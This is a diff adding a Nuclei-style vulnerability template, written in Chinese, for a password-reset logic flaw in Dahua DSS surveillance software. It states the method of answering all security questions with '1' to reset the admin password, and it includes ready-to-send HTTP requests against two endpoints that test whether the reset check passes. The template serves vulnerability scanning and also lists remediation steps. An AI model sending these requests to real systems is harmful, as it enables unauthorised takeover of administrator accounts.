@@ -1,0 +1,77 @@
+id: dahua-dss-password-reset-logic-flaw
+
+info:
+  name: Dahua DSS 密码重置逻辑缺陷漏洞
+  author: qwtd
+  severity: high
+  description: |
+    浙江大华技术股份有限公司DSS系统存在密码重置逻辑缺陷，攻击者可利用该缺陷重置系统管理员密码，进而获取敏感信息。
+    在DSS登录界面存在默认登录入口及/config配置登录页，攻击者可先故意登录失败一次以触发忘记密码功能，随后将密保问题答案全部填写为1，即可重置admin用户密码。
+  tags: Dahua-DSS
+  remediation: >-
+    升级受影响产品至最新的厂商支持版本，并安装所有可用的安全补丁。如果暂时无法升级，应限制对受影响端点的访问，尽可能禁用存在风险的功能，并采取身份认证、网络隔离和请求过滤等补偿性措施。同时检查相关 日志，并轮换可能已暴露的凭据或密钥。
+  
+http:
+  # 配置登录页
+  - raw:
+      - |
+        POST /config/user_checkQuestAnswer.action HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 279
+        sec-ch-ua-platform: "macOS"
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+        Accept: text/plain, */*; q=0.01
+        sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        sec-ch-ua-mobile: ?0
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Accept-Encoding: gzip, deflate, br, zstd
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=6BCE00FC5A18EC6168B676EF461C91F5
+
+        userBean.loginName=admin&userBean.questionNumber1=0&userBean.questionAnswer1=1d0383dcf3670a5ea80b017382d66623&userBean.questionNumber2=1&userBean.questionAnswer2=1d0383dcf3670a5ea80b017382d66623&userBean.questionNumber3=2&userBean.questionAnswer3=1d0383dcf3670a5ea80b017382d66623
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - '^true$' # 严格匹配整个响应体就是true
+        part: body
+      - type: status
+        status:
+          - 200
+  # 正常登录页
+  - raw:
+      - |
+        POST /admin/login_checkAnswer.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+        Content-Length: 173
+        Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Sec-Ch-Ua-Platform: "Windows"
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://{{Hostname}}/admin/login_login.action
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        userBean.questionAnswer1=a0b5d0071821c2d338d05f1127a1b93c&userBean.questionAnswer2=a0b5d0071821c2d338d05f1127a1b93c&userBean.questionAnswer3=a0b5d0071821c2d338d05f1127a1b93c
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - '^true$' # 严格匹配整个响应体就是true
+        part: body
+      - type: status
+        status:
+          - 200
